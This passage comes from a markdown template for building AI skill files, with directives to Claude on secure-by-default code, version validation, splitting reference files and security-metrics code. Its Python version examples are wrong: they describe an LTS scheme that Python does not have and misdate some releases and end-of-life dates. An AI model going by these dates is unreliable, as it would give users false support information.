- Truly exceptional cases (not control flow)

**Example**:
```python
# ✅ Exceptions for truly exceptional cases
class AuthenticationError(Exception):
    """Raised when authentication fails."""
    pass

def authenticate(token: str) -> User:
    if not token:
        raise AuthenticationError("Token is required")
    # ... validation
```

**Error Taxonomies** (REQUIRED for all domains):
- Categorize errors: Validation, Authentication, Authorization, Business Logic, Infrastructure
- Provide user-safe error messages (external)
- Log rich context for debugging (internal, no PII)

### 0.6 Testing Strategy Pyramid

**REQUIRED FOR ALL DOMAINS**:

```
        /\
       /  \  Security Tests (SAST, DAST, Dependency Scan)
      /    \
     /------\ Property-Based Tests (Invariants)
    /        \
   /----------\ Integration Tests (Cross-boundary validation)
  /            \
 /--------------\ Unit Tests (Happy path + edge cases + error cases)
/________________\
```

**MANDATORY**:
- Unit tests with >80% coverage
- Integration tests for external boundaries
- Security tests (SAST at minimum)

**STRONGLY RECOMMENDED**:
- Property-based tests for complex invariants
- DAST for web applications/APIs
- Fuzzing for parsers/input handlers
- Performance/load tests for high-traffic systems

### 0.7 Observability Requirements

**ALL DOMAINS MUST INCLUDE**:

**Structured Logging**:
```[language]
# ✅ Rich context, no PII/secrets
logger.info(
    "user.action",
    action="login",
    user_id=hash_id(user.id),  # Hash PII
    success=True,
    duration_ms=42,
    correlation_id="abc-123"
)

# ❌ NEVER LOG SENSITIVE DATA
logger.info("Login", password=password, email=email)  # ❌❌❌
```

**Metrics (for production systems)**:
- RED metrics: Rate, Errors, Duration
- Domain-specific KPIs

**Distributed Tracing (for microservices)**:
- OpenTelemetry/Jaeger for request flows

### 0.8 Compliance & Governance Considerations

**INSTRUCTIONS FOR CLAUDE**: At template-fill time, ASK:

"Are there compliance or regulatory requirements for this domain?"
- GDPR (data privacy, right to erasure, data portability)
- CCPA (California consumer privacy)
- HIPAA (healthcare PHI protection)
- PCI-DSS (payment card data)
- SOC 2 (service organization controls)
- ISO 27001 (information security)
- FedRAMP (US government cloud)

**If YES**: Complete Section 16 with:
- Applicable requirements
- Implementation guidance
- Audit trail patterns
- Data retention/deletion policies
- Compliance checklists

**If NO**: Section 16 can be omitted.

### 0.9 Technology Versioning Strategy

**🚨 VALIDATION GATE: Version Currency Check 🚨**

**BLOCKING for HIGH/MEDIUM-RISK domains**

---

### Version Validation Protocol

**STEP 1: Research Current Versions (MANDATORY)**

Claude MUST research version information BEFORE documenting recommendations:

```python
required_version_searches = [
    "[technology] latest stable version 2025",
    "[technology] LTS long term support",
    "[technology] end of life EOL schedule"
]

# Execute searches
version_data = perform_version_research(required_version_searches)
```

**STEP 2: Validate Version Data**

**Minimum Success Criteria:**
```python
version_validation = {
    "lts_version": {
        "version": "X.Y",
        "eol_date": "YYYY-MM-DD",  # MUST be > today
        "status": validate_not_eol()
    },
    "latest_stable": {
        "version": "X.Y",
        "release_date": "YYYY-MM-DD",  # MUST be within 12 months
        "status": validate_is_current()
    },
    "minimum_supported": {
        "version": "X.Y",
        "eol_date": "YYYY-MM-DD",  # MUST be > today
        "status": validate_not_eol()
    }
}

# BLOCKING CONDITIONS:
if version_validation["lts_version"]["eol_date"] < today():
    abort_skill_generation("Recommended LTS version is EOL")

if version_validation["latest_stable"]["release_date"] < (today() - 365 days):
    warn("Version data may be stale - latest release over 1 year old")

if version_validation["minimum_supported"]["eol_date"] < today():
    abort_skill_generation("Minimum supported version is EOL")
```

---

### Failure Response

**IF version validation fails, Claude MUST output:**

```
❌ VERSION VALIDATION FAILED ❌

Technology: [name]
Risk Level: [HIGH/MEDIUM/LOW]

Version Data Issues:
❌ LTS version: [X.Y] - EOL date: [YYYY-MM-DD] (EXPIRED)
⚠️  Latest version: [X.Y] - Released: [YYYY-MM-DD] (>12 months old - may be stale)
❌ Minimum supported: [X.Y] - EOL date: [YYYY-MM-DD] (EXPIRED)

⛔ Cannot recommend EOL versions for HIGH/MEDIUM-RISK domains ⛔

This would direct users to install vulnerable, unsupported software.

Resolution options:
1. Research current version information manually
2. Verify technology is still actively maintained
3. If technology is abandoned, consider alternatives
4. Update skill after version data is available

Task aborted. No version recommendations made.
```

**Success Response:**

```
✅ VERSION VALIDATION PASSED ✅

Technology: [name]
LTS Version: [X.Y] (EOL: YYYY-MM-DD) ✅
Latest Stable: [X.Y] (Released: YYYY-MM-DD) ✅
Minimum Supported: [X.Y] (EOL: YYYY-MM-DD) ✅

All versions validated as current and supported.
Proceeding with version documentation.
```

---

### Version Documentation Requirements

**INSTRUCTIONS FOR CLAUDE**:

At template-fill time, research current version recommendations:

**Production (LTS - Recommended)**:
- Use Long-Term Support versions for stability
- MUST include EOL date verification
- Example: Python 3.13 (LTS until 2028-10)

**Cutting-Edge (Latest Stable)**:
- Use latest stable for new features
- MUST verify release is within 12 months
- Example: Python 3.14 (released 2024-10)

**Minimum Supported**:
- Oldest version still receiving security updates
- MUST include EOL date
- Example: Python 3.11+ (EOL 2026-10)

**Avoid (End-of-Life)**:
- Versions no longer receiving security patches
- MUST mark clearly with ⚠️ symbol
- Example: Python 3.9 (EOL 2025-10) ⚠️, Python 3.8 (EOL 2024-10) ❌

**MUST INCLUDE** in Section 3:

```markdown
### 3.1 Core Technologies & Version Strategy

#### Primary Technology: [Name]

**Version Recommendations** (as of 2025-01-XX):

| Use Case | Version | Support Until | Status | Notes |
|----------|---------|---------------|--------|-------|
| **Production (LTS)** | [X.Y] | YYYY-MM-DD | ✅ Supported | Recommended for production |
| **Cutting-Edge** | [X.Y] | YYYY-MM-DD | ✅ Supported | Latest features |
| **Minimum** | [X.Y]+ | YYYY-MM-DD | ✅ Supported | Minimum for security |
| **Avoid (EOL)** | [X.Y] | Ended YYYY-MM-DD | ❌ Unsupported | No security patches ⚠️ |

**Rationale**:
- Production: Use [X.Y LTS] for stability (supported until YYYY-MM)
- New projects: Consider [Latest X.Y] if features justify
- Legacy: Upgrade from [EOL X.Y] immediately

**Security Advisory Sources**:
- Official: [URL to official security page]
- CVE Database: [URL to CVE search]
- Release Notes: [URL to changelog/releases]
```

---

### Exception Handling by Risk Level

**HIGH-RISK domains:**
- Version validation BLOCKING
- Must document current, supported versions only
- Must include EOL dates
- Must warn about EOL versions

**MEDIUM-RISK domains:**
- Version validation RECOMMENDED
- Should document EOL dates
- Should warn about unsupported versions

**LOW-RISK domains:**
- Version validation OPTIONAL
- Can document general recommendations
- EOL warnings helpful but not required

### 0.10 Critical Security Checklist (Apply to ALL Domains)

**BEFORE COMPLETING THIS TEMPLATE, CLAUDE MUST VERIFY**:

- [ ] Domain risk level identified (High/Medium/Low)
- [ ] Vulnerability research completed (web search for CVEs 2022-2025)
- [ ] Top 5-10 domain vulnerabilities documented
- [ ] OWASP/CWE mapping completed (for High/Medium risk)
- [ ] All code examples follow secure-by-default principles
- [ ] No hardcoded secrets in any code example
- [ ] Input validation demonstrated in all examples
- [ ] Error handling shows safe error messages (no info leakage)
- [ ] Logging examples exclude PII/secrets
- [ ] Security testing guidance included
- [ ] Attack scenarios documented (5 for High, 3 for Medium, 1-2 for Low)
- [ ] Compliance requirements assessed (GDPR, HIPAA, etc.)
- [ ] Version recommendations researched and current
- [ ] Anti-patterns include security pitfalls
- [ ] Pre-deployment security checklist included

### 0.11 File Organization Decision Framework

**CRITICAL**: Claude MUST decide on file organization strategy BEFORE filling the template.

**STEP 1: Estimate Total Content Size**

Based on domain risk level and requirements, estimate final skill size:

**HIGH-RISK domains** (with full security coverage):
- Sections 1-5: ~800-1200 lines
- Section 5 (Security): ~400-600 lines (if all 10 OWASP categories + 10 CVEs)
- Section 6 (Testing): ~200-300 lines
- Section 8 (Anti-patterns): ~200-300 lines
- Section 13 (Checklist): ~100-150 lines
- Section 15 (Threat modeling): ~300-400 lines (if 5+ scenarios)
- Section 16 (Compliance): ~200-400 lines (if applicable)
- **TOTAL**: 2000-3500 lines

**MEDIUM-RISK domains**:
- **TOTAL**: 1000-1500 lines

**LOW-RISK domains**:
- **TOTAL**: 300-600 lines

**STEP 2: Choose File Organization Strategy**

| Estimated Size | Strategy | Action |
|----------------|----------|--------|
| **<500 lines** | Single file | Put all content in SKILL.md |
| **500-1000 lines** | Split references | Main SKILL.md (400-600 lines) + references/ |
| **1000-2000 lines** | Split + categorize | Main SKILL.md (500-700 lines) + organized references/ |
| **>2000 lines** | Comprehensive split | Main SKILL.md (600-800 lines) + extensive references/ |

**STEP 3: Apply Splitting Rules (if splitting)**

**IF using split structure, Claude MUST**:

**KEEP in main SKILL.md (600-800 lines max)**:
1. ✅ **Section 1**: Full overview (50-80 lines)
2. ✅ **Section 2**: Full core responsibilities (80-120 lines)
3. ✅ **Section 3**: Technology stack overview (80-100 lines)
4. ✅ **Section 4**: Top 10 implementation patterns with code (200-300 lines)
5. ✅ **Section 5**: SUMMARIZED security:
   - 5.1: Top 3-5 critical vulnerabilities ONLY (not all 10)
   - 5.2: OWASP table ONLY (no full examples for all 10 categories)
   - 5.3: Input validation overview (1-2 examples, reference for more)
   - 5.4: Secrets management essentials (1 example)
   - 5.5: Error handling essentials (1 example)
6. ✅ **Section 8**: Top 10 anti-patterns (100-150 lines)
7. ✅ **Section 13**: Condensed pre-deployment checklist (50-80 lines)
8. ✅ **Section 14**: Summary (20-30 lines)
9. ✅ **Reference links** to external files

**MOVE to references/ directory**:
1. 📚 **references/security-examples.md**:
   - Full Section 5.1: All 10 vulnerability details (CVE analysis)
   - Full Section 5.2: All 10 OWASP categories with complete code examples
   - Extended Section 8.1: All security anti-patterns
2. 📚 **references/testing-guide.md**:
   - Full Section 6: Complete testing guide
   - All security test examples
   - SAST/DAST/fuzzing details
3. 📚 **references/threat-model.md**:
   - Full Section 15: All 5+ attack scenarios
   - STRIDE analysis
   - Complete threat modeling
4. 📚 **references/compliance/** (if Section 16 applicable):
   - `gdpr-guide.md`: Full GDPR implementation
   - `hipaa-guide.md`: Full HIPAA implementation
   - `pci-dss-guide.md`: Full PCI-DSS implementation
   - `soc2-guide.md`: Full SOC 2 implementation
5. 📚 **references/quick-reference.md**:
   - Full Section 9: Complete command reference
   - All configuration templates
6. 📚 **references/troubleshooting/**:
   - Full Section 11: Detailed troubleshooting
   - Debug workflows
7. 📚 **references/deployment-guide.md**:
   - Full Section 12: Deployment details
   - Configuration examples

**STEP 4: How to Reference External Files**

When splitting, Claude MUST add reference links in main SKILL.md like this:

```markdown
### 5.1 Critical Vulnerabilities (Top 3)

**1. [Vulnerability Name]** (CVE-YYYY-XXXXX)
[Brief example with mitigation]

**2. [Vulnerability Name]** (CVE-YYYY-XXXXX)
[Brief example]

**3. [Vulnerability Name]** (CVE-YYYY-XXXXX)
[Brief example]

**📚 For complete vulnerability analysis** (all 10 CVEs, full exploitation scenarios, detection methods):
→ See `references/security-examples.md#vulnerability-landscape`

---

### 5.2 OWASP Top 10 2025 Mapping

| OWASP ID | Category | Risk Level | Quick Mitigation |
|----------|----------|------------|------------------|
| A01:2025 | Broken Access Control | Critical | Authorize every request, check resource ownership |
| A02:2025 | Security Misconfiguration | High | Secure defaults, disable debug mode |
| [... condensed table for all 10 ...]

**📚 For detailed OWASP guidance** (all 10 categories with complete code examples):
→ See `references/security-examples.md#owasp-top-10-2025`
```

**STEP 5: Create File Structure**

If splitting, Claude MUST create this structure:

```
skill-name/
├── SKILL.md                    # Main skill (600-800 lines)
├── references/
│   ├── security-examples.md   # Sections 5.1, 5.2 full details
│   ├── testing-guide.md       # Section 6 complete
│   ├── threat-model.md        # Section 15 complete
│   ├── quick-reference.md     # Section 9 complete
│   ├── deployment-guide.md    # Section 12 complete
│   ├── compliance/
│   │   ├── gdpr-guide.md
│   │   ├── hipaa-guide.md
│   │   └── pci-dss-guide.md
│   └── troubleshooting/
│       └── common-issues.md
└── README.md                   # Optional: for humans
```

**INSTRUCTIONS FOR CLAUDE**:
- **BEFORE starting Section 1**, determine if splitting is needed
- **If splitting**: Follow the rules above strictly
- **Document decision**: Add note at top of SKILL.md:
  ```markdown
  > **File Organization**: This skill uses split structure. Main SKILL.md contains core
  > decision-making context. See `references/` for detailed implementations.
  ```

---

## 0.12 Reference File Usage Protocol

**Template Instructions**: **IF YOU CREATED A SPLIT STRUCTURE**, you MUST include this section with explicit instructions for reading reference files.

**CRITICAL**: This section tells Claude (when using the skill) WHEN and HOW to read reference files.

**Example Structure**:
```markdown
## Reference File Usage Protocol

**⚠️ MANDATORY**: This skill uses a split structure. Reference files contain detailed implementations that MUST be read before implementing features in those domains.

### When to Read Reference Files

**BEFORE implementing ANY feature, check if a reference file exists for that domain. If it does, READ IT FIRST.**

---

#### 1. Security Features → Read `references/security-examples.md`

**Trigger conditions** (read reference BEFORE implementing):
- User requests authentication/authorization feature
- Implementing API endpoints that handle sensitive data
- Adding input validation or sanitization
- Implementing cryptographic operations
- Any OWASP-related security requirement

**Workflow**:
```
User: "Add user authentication to the API"
    ↓
You:
  1. ✅ Recognize this is a security feature
  2. ✅ Check Section 5 → sees reference to `references/security-examples.md`
  3. ✅ READ THE FILE: Use Read tool on `references/security-examples.md`
  4. ✅ Apply COMPLETE implementation from reference (not summary from main SKILL.md)
  5. ✅ Follow all security patterns, CVE mitigations, and OWASP guidance from reference
  6. ✅ Include security tests from reference
```

**Example**:
```
# ❌ WRONG: Using summary from main SKILL.md
You implement basic JWT auth based on 10-line example in Section 5.1

# ✅ CORRECT: Reading and applying complete reference
You:
1. Read references/security-examples.md
2. Find complete JWT implementation with:
   - Token generation with proper claims
   - Signature verification
   - Expiration handling
   - Refresh token rotation
   - Security headers
   - Complete test suite
3. Apply the full pattern from reference
```

---

#### 2. Testing Features → Read `references/testing-guide.md`

**Trigger conditions**:
- User asks to write tests
- Implementing TDD workflow
- Adding property-based tests
- Setting up test infrastructure
- Any testing-related request

**Workflow**:
```
User: "Write tests for the authentication module"
    ↓
You:
  1. ✅ Check Section 6 → sees reference to `references/testing-guide.md`
  2. ✅ READ THE FILE: Use Read tool on `references/testing-guide.md`
  3. ✅ Apply complete testing patterns (unit, integration, property-based)
  4. ✅ Use test fixtures and helpers from reference
  5. ✅ Follow test organization structure from reference
```

---

#### 3. Observability Features → Read `references/observability-setup.md`

**Trigger conditions**:
- Adding logging, metrics, or tracing
- Implementing monitoring
- Setting up dashboards
- Debugging production issues

**Workflow**:
```
User: "Add structured logging to the service"
    ↓
You:
  1. ✅ Check Section 6.5 → sees reference to `references/observability-setup.md`
  2. ✅ READ THE FILE
  3. ✅ Apply complete structured logging setup
  4. ✅ Include metrics and tracing from reference
```

---

#### 4. Compliance Features → Read `references/compliance/[framework]-guide.md`

**Trigger conditions**:
- User mentions GDPR, HIPAA, PCI-DSS, SOC2, etc.
- Implementing compliance requirements
- Adding audit logging
- Data privacy features

**Workflow**:
```
User: "Make this GDPR compliant"
    ↓
You:
  1. ✅ Check Section 5.4 or 12 → sees reference to `references/compliance/gdpr-guide.md`
  2. ✅ READ THE FILE
  3. ✅ Apply ALL GDPR requirements from reference:
     - Right to erasure
     - Data portability
     - Consent management
     - Privacy by design
     - Audit logging
```

---

### Reference File Reading Checklist

**Before implementing ANY feature, complete this checklist**:

- [ ] **Identify domain**: What type of feature is this? (Security, Testing, Observability, Compliance, etc.)
- [ ] **Check main SKILL.md**: Does the relevant section reference external files?
- [ ] **IF reference exists**:
  - [ ] Use Read tool to read the ENTIRE reference file
  - [ ] Review ALL patterns and examples in reference
  - [ ] Apply COMPLETE implementation (not summary)
  - [ ] Include tests from reference
  - [ ] Follow best practices from reference
- [ ] **IF no reference exists**:
  - [ ] Use guidance from main SKILL.md
  - [ ] Apply patterns from Section 4

---

### Example: Complete Workflow with References

**Scenario**: User asks "Implement a secure user registration endpoint"

**Step 1: Analyze request**
- Feature type: Security (authentication)
- Involves: Input validation, password hashing, database operations
- Risk level: HIGH (handles credentials)

**Step 2: Check for references**
- Section 5 (Security) mentions `references/security-examples.md`
- Section 6 (Testing) mentions `references/testing-guide.md`

**Step 3: Read references FIRST**
```python
# You execute these Read operations:
Read("references/security-examples.md")  # Get complete security patterns
Read("references/testing-guide.md")      # Get complete testing patterns
```

**Step 4: Apply complete patterns**
- Use password hashing from security reference (bcrypt with proper cost)
- Use input validation from security reference (multi-layer)
- Use SQL injection prevention from security reference
- Use security tests from testing reference
- Use integration tests from testing reference

**Step 5: Implement with full context**
```python
# Your implementation includes:
# ✅ Complete password validation (from reference)
# ✅ Bcrypt with cost factor 12 (from reference)
# ✅ Parameterized queries (from reference)
# ✅ Rate limiting (from reference)
# ✅ Security headers (from reference)
# ✅ Comprehensive tests (from reference)
# ✅ Logging without PII (from reference)
```

---

### Anti-Pattern: Using References Incorrectly

**❌ WRONG**:
```
User: "Add authentication"
You: Look at Section 5.1 summary, implement basic JWT based on 10-line example
Result: Missing refresh tokens, security headers, proper error handling
```

**✅ CORRECT**:
```
User: "Add authentication"
You:
  1. Check Section 5.1 → sees reference to security-examples.md
  2. Read("references/security-examples.md")
  3. Find complete JWT implementation (100+ lines with all features)
  4. Apply complete pattern including:
     - Access + refresh tokens
     - Token rotation
     - Security headers
     - Rate limiting
     - Comprehensive error handling
     - Full test suite
Result: Production-ready, secure authentication
```

---

### Summary

**Golden Rule**: If a reference file exists for the domain you're working in, **READ IT FIRST, APPLY IT COMPLETELY**.

**Reference files are not optional documentation—they are required reading for production-quality implementations.**
```

---

## 0.13 Security Metrics & KPIs (Key Performance Indicators)

**Template Instructions**:
- **MANDATORY FOR**: All HIGH-risk production systems
- **RECOMMENDED FOR**: All MEDIUM-risk production systems
- **INCLUDE**: Measurable security metrics to track security posture over time

**Purpose**: Define and track quantifiable security metrics to measure effectiveness of security controls and identify areas for improvement.

**Example Structure**:
```markdown
## Security Metrics & KPIs

**Security Measurement Philosophy**: "You can't improve what you don't measure." Track these metrics continuously to ensure security posture improves over time.

### Metric Categories

#### 1. Vulnerability Management Metrics (MANDATORY)

**1.1 Mean Time to Detect (MTTD) Vulnerabilities**

```python
class VulnerabilityMetrics:
    def calculate_mttd(self, vulnerability_id: str) -> float:
        """
        Calculate time between vulnerability publication and detection in our systems

        Target: <24 hours for CRITICAL, <7 days for HIGH
        """
        vuln_published = self.get_cve_publish_date(vulnerability_id)
        vuln_detected = self.get_detection_date_in_our_systems(vulnerability_id)

        mttd_hours = (vuln_detected - vuln_published).total_seconds() / 3600

        # Track metric
        metrics.histogram(
            'security.vulnerability.mttd_hours',
            tags={
                'severity': self.get_severity(vulnerability_id),
                'source': 'dependency_scan'
            }
        ).observe(mttd_hours)

        return mttd_hours

    def get_mttd_slo_compliance(self) -> Dict[str, float]:
        """Check if MTTD meets SLO targets"""
        return {
            'critical': self._check_slo('CRITICAL', target_hours=24),
            'high': self._check_slo('HIGH', target_hours=168),  # 7 days
            'medium': self._check_slo('MEDIUM', target_hours=720)  # 30 days
        }
```

**MTTD Targets**:
| Severity  | Detection Target | Measurement |
|-----------|------------------|-------------|
| CRITICAL  | <24 hours        | From CVE publish to scan detection |
| HIGH      | <7 days          | From CVE publish to scan detection |
| MEDIUM    | <30 days         | From CVE publish to scan detection |
| LOW       | <90 days         | From CVE publish to scan detection |

**1.2 Mean Time to Remediate (MTTR) Vulnerabilities**

```python
def calculate_mttr(self, vulnerability_id: str) -> float:
    """
    Calculate time between detection and full remediation (patch deployed to production)

    Target: <48 hours for CRITICAL, <14 days for HIGH
    """
    detected_at = self.get_detection_date(vulnerability_id)
    remediated_at = self.get_remediation_date(vulnerability_id)  # Patch in production

    mttr_hours = (remediated_at - detected_at).total_seconds() / 3600

    metrics.histogram(
        'security.vulnerability.mttr_hours',
        tags={'severity': self.get_severity(vulnerability_id)}
    ).observe(mttr_hours)

    return mttr_hours
```

**MTTR Targets** (from detection to production patch):
| Severity  | Remediation Target | Action |
|-----------|-------------------|---------|
| CRITICAL  | <48 hours         | Emergency patch, deploy immediately |
| HIGH      | <14 days          | Priority patch, next sprint |
| MEDIUM    | <60 days          | Standard patch cycle |
| LOW       | <180 days         | Next major release |

**1.3 Vulnerability Window (Exposure Time)**

```python
def calculate_vulnerability_window(self, vulnerability_id: str) -> Dict[str, float]:
    """
    Measure total time system was vulnerable
    Window = CVE_publish_date → Patch_in_production

    Target: Minimize window, especially for CRITICAL/HIGH
    """
    cve_published = self.get_cve_publish_date(vulnerability_id)
    patched_in_prod = self.get_remediation_date(vulnerability_id)

    total_window_hours = (patched_in_prod - cve_published).total_seconds() / 3600

    return {
        'vulnerability_id': vulnerability_id,
        'severity': self.get_severity(vulnerability_id),
        'window_hours': total_window_hours,
        'window_days': total_window_hours / 24,
        'slo_met': self._check_window_slo(total_window_hours, self.get_severity(vulnerability_id))
    }
```

**Vulnerability Window Targets**:
| Severity  | Maximum Window | Why |
|-----------|---------------|-----|
| CRITICAL  | <72 hours     | Active exploitation likely |
| HIGH      | <21 days      | Exploitation tools published quickly |
| MEDIUM    | <90 days      | Reduces attack surface |
| LOW       | <180 days     | General hygiene |

#### 2. Security Testing Metrics (MANDATORY)

**2.1 Security Test Coverage**

```python
class SecurityTestMetrics:
    def calculate_security_test_coverage(self) -> Dict[str, float]:
        """
        Measure percentage of security-critical code covered by security-specific tests

        Target: ≥90% coverage for authentication, authorization, input validation, cryptography
        """
        critical_code_paths = [
            'authentication/',
            'authorization/',
            'input_validation/',
            'cryptography/',
            'secrets_management/'
        ]

        results = {}
        for path in critical_code_paths:
            total_lines = self._count_lines_in_path(path)
            covered_lines = self._count_covered_lines(path, test_type='security')
            coverage_pct = (covered_lines / total_lines) * 100

            results[path] = {
                'coverage_percent': coverage_pct,
                'slo_met': coverage_pct >= 90,
                'gap': max(0, 90 - coverage_pct)
            }

            metrics.gauge(
                'security.test_coverage.percent',
                tags={'module': path}
            ).set(coverage_pct)

        return results
```

**Security Test Coverage Targets**:
| Code Category | Minimum Coverage | Test Types Required |
|---------------|-----------------|---------------------|
| Authentication | 95% | Unit + Integration + Pentest |
| Authorization | 95% | Unit + Integration + Pentest |
| Input Validation | 90% | Unit + Fuzzing |
| Cryptography | 100% | Unit + Property-based |
| Secrets Management | 95% | Unit + Integration |
| API Endpoints | 85% | Integration + Security regression |

**2.2 Security Regression Test Count**

```python
def count_security_regression_tests(self) -> int:
    """
    Count number of permanent tests for previously-found vulnerabilities

    Target: Every CVE/security bug MUST have ≥1 regression test
    """
    test_files = self._find_files('tests/security/regression/*')

    regression_test_count = 0
    for file in test_files:
        # Count tests that reference a CVE or security bug
        tests = self._parse_test_file(file)
        regression_test_count += len([t for t in tests if 'CVE' in t.name or 'security-bug' in t.tags])

    metrics.gauge('security.regression_tests.count').set(regression_test_count)

    return regression_test_count
```

**Target**: 100% of security vulnerabilities have permanent regression tests

#### 3. Dependency Security Metrics (MANDATORY for Production)

**3.1 Dependency Age Tracking**

```python
class DependencyMetrics:
    def calculate_dependency_age(self) -> Dict[str, any]:
        """
        Track age of dependencies to identify stale/unmaintained packages

        Target: No dependencies >2 years old, no unmaintained packages
        """
        dependencies = self._parse_lock_file()

        results = []
        for dep in dependencies:
            current_version_date = self._get_version_publish_date(dep.name, dep.version)
            latest_version_date = self._get_latest_version_date(dep.name)

            age_days = (datetime.now() - current_version_date).days
            behind_latest_days = (latest_version_date - current_version_date).days

            results.append({
                'name': dep.name,
                'current_version': dep.version,
                'age_days': age_days,
                'behind_latest_days': behind_latest_days,
                'risk_level': self._assess_age_risk(age_days, behind_latest_days)
            })

            metrics.histogram(
                'security.dependency.age_days',
                tags={'package': dep.name}
            ).observe(age_days)

        return {
            'dependencies': results,
            'total_count': len(results),
            'stale_count': len([r for r in results if r['age_days'] > 730]),  # >2 years
            'outdated_count': len([r for r in results if r['behind_latest_days'] > 180])
        }
```

**Dependency Age Targets**:
| Age | Risk Level | Action |
|-----|------------|--------|
| <6 months | LOW | Normal monitoring |
| 6-12 months | MEDIUM | Plan upgrade in next quarter |
| 12-24 months | HIGH | Upgrade within 30 days |
| >24 months | CRITICAL | Immediate upgrade or replace |

**3.2 Known Vulnerabilities in Dependencies**

```python
def count_vulnerable_dependencies(self) -> Dict[str, int]:
    """
    Count dependencies with known vulnerabilities by severity

    Target: Zero CRITICAL/HIGH vulnerabilities in production
    """
    sbom = self._generate_sbom()
    vuln_report = self._scan_sbom(sbom)  # Using grype, snyk, etc.

    counts = {
        'critical': 0,
        'high': 0,
        'medium': 0,
        'low': 0
    }

    for vuln in vuln_report['vulnerabilities']:
        severity = vuln['severity'].lower()
        counts[severity] = counts.get(severity, 0) + 1

        metrics.counter(
            'security.dependency.vulnerabilities',
            tags={'severity': severity, 'package': vuln['package']}
        ).increment()

    return counts
```

**Target**: Zero CRITICAL/HIGH vulnerabilities (blocks deployment via CI/CD gates)

#### 4. Incident Response Metrics (MANDATORY for HIGH-risk)

**4.1 Mean Time to Detect (MTTD) Security Incidents**

```python
def calculate_incident_mttd(self, incident_id: str) -> float:
    """
    Time between incident start and detection

    Target: <5 minutes for P0, <15 minutes for P1
    """
    incident_start = self._estimate_incident_start(incident_id)  # From logs
    incident_detected = self.get_incident_detection_time(incident_id)  # Alert fired

    mttd_minutes = (incident_detected - incident_start).total_seconds() / 60

    metrics.histogram(
        'security.incident.mttd_minutes',
        tags={'severity': self.get_incident_severity(incident_id)}
    ).observe(mttd_minutes)

    return mttd_minutes
```

**Incident MTTD Targets**:
| Severity    | Detection Target | Example |
|-------------|-----------------|---------|
| P0-CRITICAL | <5 minutes      | Active breach, data exfiltration |
| P1-HIGH     | <15 minutes     | Privilege escalation, unauthorized access |
| P2-MEDIUM   | <1 hour         | Suspicious activity, failed attacks |
| P3-LOW      | <24 hours       | Policy violations, anomalies |

**4.2 Mean Time to Respond (MTTR) Security Incidents**

```python
def calculate_incident_mttr(self, incident_id: str) -> float:
    """
    Time from detection to containment

    Target: <1 hour for P0, <4 hours for P1
    """
    detected_at = self.get_incident_detection_time(incident_id)
    contained_at = self.get_incident_containment_time(incident_id)  # Threat neutralized

    mttr_minutes = (contained_at - detected_at).total_seconds() / 60

    metrics.histogram(
        'security.incident.mttr_minutes',
        tags={'severity': self.get_incident_severity(incident_id)}
    ).observe(mttr_minutes)

    return mttr_minutes
```

**Incident MTTR Targets**:
| Severity    | Response Target | Actions |
|-------------|----------------|---------|
| P0-CRITICAL | <1 hour        | Block IP, revoke creds, isolate service |
| P1-HIGH     | <4 hours       | Containment + investigation |
| P2-MEDIUM   | <24 hours      | Analysis + mitigation plan |
| P3-LOW      | <7 days        | Root cause analysis + fix |

#### 5. Security Debt Metrics (RECOMMENDED)

**5.1 Security Debt Score**

```python
class SecurityDebtMetrics:
    def calculate_security_debt_score(self) -> Dict[str, any]:
        """
        Quantify accumulated security debt

        Lower score = better security posture
        """
        debt_items = {
            'outdated_dependencies': self._count_outdated_deps(),
            'missing_security_tests': self._count_untested_critical_code(),
            'open_security_bugs': self._count_open_security_tickets(),
            'legacy_auth_code': self._count_deprecated_auth_patterns(),
            'unrotated_secrets': self._count_stale_secrets(),
            'missing_security_headers': self._count_missing_headers()
        }

        # Weight by severity
        weights = {
            'outdated_dependencies': 10,      # Each outdated dep = 10 points
            'missing_security_tests': 5,      # Each missing test = 5 points
            'open_security_bugs': 20,         # Each open bug = 20 points
            'legacy_auth_code': 15,           # Each legacy pattern = 15 points
            'unrotated_secrets': 25,          # Each stale secret = 25 points
            'missing_security_headers': 3     # Each missing header = 3 points
        }

        total_debt_score = sum(count * weights[category]
                               for category, count in debt_items.items())

        metrics.gauge('security.debt.total_score').set(total_debt_score)

        return {
            'total_score': total_debt_score,
            'breakdown': debt_items,
            'risk_level': self._assess_debt_risk(total_debt_score)
        }

    def _assess_debt_risk(self, score: int) -> str:
        if score < 50: return 'LOW'
        elif score < 150: return 'MEDIUM'
        elif score < 300: return 'HIGH'
        else: return 'CRITICAL'
```

**Security Debt Score Targets**:
| Score Range | Risk Level | Action |
|-------------|------------|--------|
| 0-50        | LOW        | Maintain current posture |
| 51-150      | MEDIUM     | Plan remediation in next quarter |
| 151-300     | HIGH       | Immediate remediation plan required |
| >300        | CRITICAL   | Stop new features, fix debt first |

#### 6. Security Gate Metrics (MANDATORY for CI/CD)

**6.1 Security Gate Pass Rate**

```python
def calculate_gate_pass_rate(self, days: int = 30) -> Dict[str, float]:
    """
    Percentage of deployments that pass security gates on first attempt

    Target: ≥95% pass rate (indicates developers following security practices)
    """
    gates = [
        'vulnerability_scan',
        'secret_detection',
        'license_compliance',
        'security_tests',
        'sbom_generation'
    ]

    results = {}
    for gate in gates:
        total_runs = self._count_gate_runs(gate, days=days)
        passed_runs = self._count_gate_passes(gate, days=days)
        pass_rate = (passed_runs / total_runs) * 100 if total_runs > 0 else 0

        results[gate] = {
            'pass_rate_percent': pass_rate,
            'total_runs': total_runs,
            'passed_runs': passed_runs,
            'failed_runs': total_runs - passed_runs,
            'slo_met': pass_rate >= 95
        }

        metrics.gauge(
            'security.gate.pass_rate',
            tags={'gate': gate}
        ).set(pass_rate)

    return results
```

**Target**: ≥95% first-time pass rate for all security gates

### Dashboard & Reporting

**Example Grafana Dashboard Configuration**:

```yaml
# Security Metrics Dashboard
dashboard:
  title: "Security Posture Metrics"
  refresh: "1m"

  panels:
    - title: "Vulnerability MTTD/MTTR"
      type: graph
      metrics:
        - security.vulnerability.mttd_hours (by severity)
        - security.vulnerability.mttr_hours (by severity)
      thresholds:
        critical_mttd: 24h
        critical_mttr: 48h

    - title: "Open Vulnerabilities by Severity"
      type: stat
      metrics:
        - security.vulnerability.open_count (by severity)
      alert: critical_count > 0 OR high_count > 5

    - title: "Security Test Coverage"
      type: gauge
      metrics:
        - security.test_coverage.percent (by module)
      thresholds:
        red: < 80%
        yellow: 80-90%
        green: > 90%

    - title: "Security Debt Score"
      type: stat
      metrics:
        - security.debt.total_score
      thresholds:
        green: < 50
        yellow: 50-150
        orange: 150-300
        red: > 300

    - title: "Security Gate Pass Rates (30 days)"
      type: bar_chart
      metrics:
